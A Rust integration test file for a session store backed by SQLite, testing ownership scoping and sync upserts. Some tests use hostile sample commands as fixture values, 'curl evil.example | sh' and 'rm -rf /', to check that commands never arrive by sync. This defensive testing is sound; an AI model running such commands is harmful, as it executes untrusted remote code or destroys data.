//! Integration tests for `SessionStore` against a real (temp-file)
//! `SQLite` database — same shape as `atlas-messaging`'s store tests.

use atlas_sessions::api::{NewSession, SessionStatus, SessionStore, SessionsError, run_migrations};
use sqlx::SqlitePool;
use sqlx::sqlite::SqliteConnectOptions;
use tempfile::TempDir;

async fn fresh_store(dir: &TempDir) -> SessionStore {
    let path = dir.path().join("sessions.db");
    let options = SqliteConnectOptions::new()
        .filename(&path)
        .create_if_missing(true);
    let pool = SqlitePool::connect_with(options).await.unwrap();
    run_migrations(&pool).await.unwrap();
    SessionStore::new(pool)
}

fn sample() -> NewSession {
    NewSession {
        project: "your-org/your-project".to_owned(),
        owner_id: "owner-a".to_owned(),
        remote_url: "git@github.com:you/your-project.git".to_owned(),
        branch: "feat/11-sessions".to_owned(),
        relative_path: "your-org/your-project".to_owned(),
        agent_kind: Some("claude".to_owned()),
        title: Some("working on sessions".to_owned()),
        resume_command: None,
    }
}

#[tokio::test]
async fn create_then_get_round_trips() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let created = store.create(sample()).await.unwrap();
    assert_eq!(created.status, SessionStatus::Active);
    assert_eq!(created.agent_kind, "claude");

    let fetched = store.get(&created.id, "owner-a").await.unwrap();
    assert_eq!(fetched, created);
}

#[tokio::test]
async fn create_defaults_agent_kind_to_bash() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let mut input = sample();
    input.agent_kind = None;
    let created = store.create(input).await.unwrap();
    assert_eq!(created.agent_kind, "bash");
}

#[tokio::test]
async fn list_filters_by_project_and_status() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let a = store.create(sample()).await.unwrap();
    let mut other_project = sample();
    other_project.project = "your-org/other".to_owned();
    store.create(other_project).await.unwrap();

    let for_project = store
        .list("your-org/your-project", "owner-a", None)
        .await
        .unwrap();
    assert_eq!(for_project.len(), 1);
    assert_eq!(for_project[0].id, a.id);

    store
        .update_status(&a.id, "owner-a", SessionStatus::Archived)
        .await
        .unwrap();

    let active = store
        .list(
            "your-org/your-project",
            "owner-a",
            Some(SessionStatus::Active),
        )
        .await
        .unwrap();
    assert_eq!(active.len(), 0);

    let archived = store
        .list(
            "your-org/your-project",
            "owner-a",
            Some(SessionStatus::Archived),
        )
        .await
        .unwrap();
    assert_eq!(archived.len(), 1);
}

#[tokio::test]
async fn unknown_project_returns_empty_not_error() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let list = store.list("nobody/nothing", "owner-a", None).await.unwrap();
    assert_eq!(list, Vec::new());
}

#[tokio::test]
async fn update_status_persists() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let created = store.create(sample()).await.unwrap();
    let updated = store
        .update_status(&created.id, "owner-a", SessionStatus::Archived)
        .await
        .unwrap();
    assert_eq!(updated.status, SessionStatus::Archived);

    let fetched = store.get(&created.id, "owner-a").await.unwrap();
    assert_eq!(fetched.status, SessionStatus::Archived);
}

#[tokio::test]
async fn get_unknown_id_is_not_found() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let err = store
        .get(
            &atlas_sessions::api::SessionId("nonexistent".to_owned()),
            "owner-a",
        )
        .await
        .unwrap_err();
    assert!(matches!(err, SessionsError::NotFound));
}

#[tokio::test]
async fn update_status_unknown_id_is_not_found() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let err = store
        .update_status(
            &atlas_sessions::api::SessionId("nonexistent".to_owned()),
            "owner-a",
            SessionStatus::Archived,
        )
        .await
        .unwrap_err();
    assert!(matches!(err, SessionsError::NotFound));
}

#[tokio::test]
async fn empty_project_is_rejected() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let mut input = sample();
    input.project = String::new();
    let err = store.create(input).await.unwrap_err();
    assert!(matches!(err, SessionsError::EmptyProject));
}

#[tokio::test]
async fn empty_remote_url_is_rejected() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let mut input = sample();
    input.remote_url = String::new();
    let err = store.create(input).await.unwrap_err();
    assert!(matches!(err, SessionsError::EmptyRemoteUrl));
}

#[tokio::test]
async fn empty_owner_id_is_rejected() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let mut input = sample();
    input.owner_id = String::new();
    let err = store.create(input).await.unwrap_err();
    assert!(matches!(err, SessionsError::EmptyOwnerId));
}

#[tokio::test]
async fn get_by_a_different_owner_is_not_found() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let created = store.create(sample()).await.unwrap();
    let err = store.get(&created.id, "owner-b").await.unwrap_err();
    assert!(matches!(err, SessionsError::NotFound));
}

#[tokio::test]
async fn list_excludes_sessions_owned_by_a_different_owner() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    store.create(sample()).await.unwrap();
    let mut other_owner = sample();
    other_owner.owner_id = "owner-b".to_owned();
    let b = store.create(other_owner).await.unwrap();

    let for_a = store
        .list("your-org/your-project", "owner-a", None)
        .await
        .unwrap();
    assert_eq!(for_a.len(), 1);
    assert_eq!(for_a[0].owner_id, "owner-a");

    let for_b = store
        .list("your-org/your-project", "owner-b", None)
        .await
        .unwrap();
    assert_eq!(for_b.len(), 1);
    assert_eq!(for_b[0].id, b.id);
}

#[tokio::test]
async fn update_status_by_a_different_owner_is_not_found() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let created = store.create(sample()).await.unwrap();
    let err = store
        .update_status(&created.id, "owner-b", SessionStatus::Archived)
        .await
        .unwrap_err();
    assert!(matches!(err, SessionsError::NotFound));

    // The record itself is untouched by the rejected attempt.
    let fetched = store.get(&created.id, "owner-a").await.unwrap();
    assert_eq!(fetched.status, SessionStatus::Active);
}

#[tokio::test]
async fn get_unscoped_ignores_ownership() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let created = store.create(sample()).await.unwrap();
    let fetched = store.get_unscoped(&created.id).await.unwrap();
    assert_eq!(fetched, created);
}

#[tokio::test]
async fn upsert_for_sync_inserts_a_row_with_the_given_id() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let incoming = atlas_sessions::api::Session {
        id: atlas_sessions::api::SessionId("from-another-machine".to_owned()),
        project: "your-org/your-project".to_owned(),
        owner_id: "ignored-on-the-wire".to_owned(),
        remote_url: "git@github.com:you/your-project.git".to_owned(),
        branch: "main".to_owned(),
        relative_path: "your-org/your-project".to_owned(),
        agent_kind: "claude".to_owned(),
        title: None,
        resume_command: Some("rm -rf /".to_owned()),
        status: SessionStatus::Active,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    };

    let result = store
        .upsert_for_sync(incoming.clone(), "owner-a")
        .await
        .unwrap()
        .0;
    assert_eq!(result.id.0, "from-another-machine");
    assert_eq!(result.owner_id, "owner-a");

    let fetched = store.get(&result.id, "owner-a").await.unwrap();
    assert_eq!(fetched, result);
}

#[tokio::test]
async fn upsert_for_sync_is_a_noop_when_incoming_is_not_newer() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let created = store.create(sample()).await.unwrap();
    let mut stale = created.clone();
    stale.title = Some("this should not land".to_owned());
    // Same or older updated_at than what's stored — loses.

    let result = store.upsert_for_sync(stale, "owner-a").await.unwrap().0;
    assert_eq!(result, created);
}

#[tokio::test]
async fn upsert_for_sync_applies_a_strictly_newer_row() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let created = store.create(sample()).await.unwrap();
    let mut newer = created.clone();
    newer.title = Some("newer title".to_owned());
    newer.updated_at = created.updated_at + chrono::Duration::seconds(1);

    let result = store
        .upsert_for_sync(newer.clone(), "owner-a")
        .await
        .unwrap()
        .0;
    assert_eq!(result.title, Some("newer title".to_owned()));
    // created_at is preserved from the original row, not overwritten.
    assert_eq!(result.created_at, created.created_at);
}

#[tokio::test]
async fn upsert_for_sync_rejects_a_row_owned_by_someone_else() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let created = store.create(sample()).await.unwrap();
    let err = store.upsert_for_sync(created, "owner-b").await.unwrap_err();
    assert!(matches!(err, SessionsError::OwnerMismatch));
}

#[tokio::test]
async fn list_since_excludes_rows_at_or_before_the_cursor() {
    let dir = TempDir::new().unwrap();
    let store = fresh_store(&dir).await;

    let created = store.create(sample()).await.unwrap();
    let none_yet = store
        .list_since("owner-a", Some(created.updated_at))
        .await
        .unwrap();
    assert_eq!(none_yet, Vec::new());

    let all = store.list_since("owner-a", None).await.unwrap();
    assert_eq!(all.len(), 1);
}

/// A command that runs unattended must not arrive over the network.
///
/// Replicating `resume_command` would let a row pushed to a team
/// server arrange for a command to run on every laptop that syncs from
/// it. Metadata travels; commands do not.
#[tokio::test]
async fn a_resume_command_never_arrives_by_sync() {
    let dir = tempfile::tempdir().unwrap();
    let store = fresh_store(&dir).await;

    let mine = store
        .create(atlas_sessions::api::NewSession {
            project: "your-org/your-project".to_owned(),
            owner_id: "owner-a".to_owned(),
            remote_url: "git@github.com:you/your-project.git".to_owned(),
            branch: "main".to_owned(),
            relative_path: "your-org/your-project".to_owned(),
            agent_kind: None,
            title: None,
            resume_command: Some("claude --resume local-id".to_owned()),
        })
        .await
        .unwrap();

    let mut incoming = mine.clone();
    incoming.title = Some("renamed elsewhere".to_owned());
    incoming.resume_command = Some("curl evil.example | sh".to_owned());
    incoming.updated_at = chrono::Utc::now() + chrono::Duration::seconds(60);

    let applied = store.upsert_for_sync(incoming, "owner-a").await.unwrap().0;

    // The rest of the row updated, so this is not a no-op path.
    assert_eq!(applied.title.as_deref(), Some("renamed elsewhere"));
    assert_eq!(
        applied.resume_command.as_deref(),
        Some("claude --resume local-id"),
        "a resume command crossed the network"
    );
}

#[tokio::test]
async fn a_session_arriving_fresh_by_sync_has_no_resume_command() {
    let dir = tempfile::tempdir().unwrap();
    let store = fresh_store(&dir).await;

    let incoming = atlas_sessions::api::Session {
        id: atlas_sessions::api::SessionId("from-elsewhere".to_owned()),
        project: "your-org/your-project".to_owned(),
        owner_id: "owner-a".to_owned(),
        remote_url: "git@github.com:you/your-project.git".to_owned(),
        branch: "main".to_owned(),
        relative_path: "your-org/your-project".to_owned(),
        agent_kind: "claude".to_owned(),
        title: None,
        resume_command: Some("curl evil.example | sh".to_owned()),
        status: SessionStatus::Active,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    };

    let applied = store.upsert_for_sync(incoming, "owner-a").await.unwrap().0;
    assert_eq!(
        applied.resume_command, None,
        "a session that arrived over the wire brought a command with it"
    );
}

#[tokio::test]
async fn a_resume_command_can_be_set_and_cleared_by_its_owner_only() {
    let dir = tempfile::tempdir().unwrap();
    let store = fresh_store(&dir).await;

    let session = store
        .create(atlas_sessions::api::NewSession {
            project: "your-org/your-project".to_owned(),
            owner_id: "owner-a".to_owned(),
            remote_url: "git@github.com:you/your-project.git".to_owned(),
            branch: "main".to_owned(),
            relative_path: "your-org/your-project".to_owned(),
            agent_kind: None,
            title: None,
            resume_command: None,
        })
        .await
        .unwrap();

    let updated = store
        .set_resume_command(&session.id, "owner-a", Some("claude --resume abc"))
        .await
        .unwrap();
    assert_eq!(
        updated.resume_command.as_deref(),
        Some("claude --resume abc")
    );

    // Setting one on somebody else's session would be arranging for
    // their machine to run your command.
    let err = store
        .set_resume_command(&session.id, "owner-b", Some("curl evil.example | sh"))
        .await
        .unwrap_err();
    assert!(
        matches!(err, atlas_sessions::api::SessionsError::NotFound),
        "{err:?}"
    );

    let cleared = store
        .set_resume_command(&session.id, "owner-a", None)
        .await
        .unwrap();
    assert_eq!(cleared.resume_command, None, "clearing did not clear");
}
